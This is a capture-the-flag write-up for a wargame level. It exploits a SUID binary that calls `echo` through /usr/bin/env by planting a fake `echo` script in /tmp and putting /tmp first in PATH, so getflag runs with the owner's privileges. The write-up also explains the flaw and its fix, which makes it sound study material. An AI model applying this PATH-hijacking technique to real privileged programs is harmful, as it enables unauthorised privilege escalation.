# Level 03

## 1. Target Information
- **User:** `level03`
- **Password:** `***FLAG02***`
- **Target:** `flag03`
- **SSH Port:** `4242`

---

## 2. Reconnaissance & Discovery
Search for files owned by `flag03`:

```bash
find / -user flag03 2>/dev/null
ls -l
file level03
```

**Findings:**
- A SUID executable owned by `flag03` is present:
```text
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
- The `s` in the owner field is the **SUID bit**: the program runs with `flag03`'s privileges regardless of who launches it.
- Inspecting the binary (`strings`) shows it calls:
```text
/usr/bin/env echo ...
```

---

## 3. Vulnerability Analysis
- **Flaw Type:** PATH hijacking of an unqualified command in a SUID program.
- **Technical Explanation:**
  - The binary invokes `echo` **through `/usr/bin/env`**, which resolves the name `echo` by searching `$PATH` left to right — it does **not** use an absolute path like `/bin/echo`.
  - `$PATH` is attacker-controlled. By placing an executable named `echo` earlier in `$PATH`, the program runs *that* file instead of the real `echo`.
  - Because the binary is SUID `flag03`, the hijacked `echo` also executes **as `flag03`** — allowing arbitrary command execution with elevated privileges, including running `getflag`.
  - **Root cause / fix:** privileged programs must call helpers by absolute path and sanitise their environment (`PATH`, `IFS`, ...).

---

## 4. Exploitation Walkthrough

### Step 1: Create a malicious `echo` in a writable directory
A plain shell script is enough (no compilation needed): a shebang plus the command to run, made executable.
```bash
cd /tmp
printf '#!/bin/sh\ngetflag\n' > echo
chmod +x echo
```

> `/tmp` is writable but periodically wiped, so it is only used to *run* the exploit. The helper script is kept in this `resources/` folder for proof.

### Step 2: Put that directory first in `$PATH`
```bash
export PATH=/tmp:$PATH
which echo          # must resolve to /tmp/echo, not /bin/echo
```

### Step 3: Run the SUID binary
```bash
~/level03
# /usr/bin/env resolves `echo` -> /tmp/echo, which runs as flag03
# getflag executes with flag03's privileges:
# Check flag.Here is your token: ***FLAG03***
```

---

## 5. Flag
```text
Check flag.Here is your token: ***FLAG03***
```
- **Next Level User:** `level04`
- **Password for next level:** `***FLAG03***`
